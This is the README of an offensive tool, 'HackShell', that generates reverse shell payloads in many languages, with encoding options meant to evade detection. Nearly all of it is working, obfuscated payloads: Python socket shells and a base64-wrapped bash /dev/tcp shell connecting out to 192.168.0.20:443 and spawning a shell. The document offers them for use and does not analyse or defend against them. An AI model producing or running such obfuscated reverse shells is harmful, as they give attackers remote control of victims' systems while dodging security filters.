# HackShell - Generator of some different reverse shells:
```
usage: python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type hex

.------..------..------..------..------..------..------..------..------.
|H.--. ||A.--. ||C.--. ||K.--. ||S.--. ||H.--. ||E.--. ||L.--. ||L.--. |
| :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || :/\: |
| (__) || :\/: || :\/: || :\/: || :\/: || (__) || :\/: || (__) || (__) |
| '--'H|| '--'A|| '--'C|| '--'K|| '--'S|| '--'H|| '--'E|| '--'L|| '--'L|
`------'`------'`------'`------'`------'`------'`------'`------'`------'

optional arguments:
  -h, --help         show this help message and exit
  --payload PAYLOAD  bash,zsh,nc,php,python,perl,ruby,lua,groovy,nodejs,all
  --lhost LHOST      ip
  --lport LPORT      port
  --type TYPE        b64,urle,int,octa,hex,jlre,funf
```
`
python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex
`
```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0xC0A80014",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
`
python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa
`
```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
`
python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type long
`
```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3232235540",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
`
python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type jlre
`
```
py%24%28%29thon%20%24%28%29c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.0.20%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
```
`
python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type b64
`
```
cHkkKCl0aG9uIC0kKCljICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
```
`
python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre
`
```
bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
```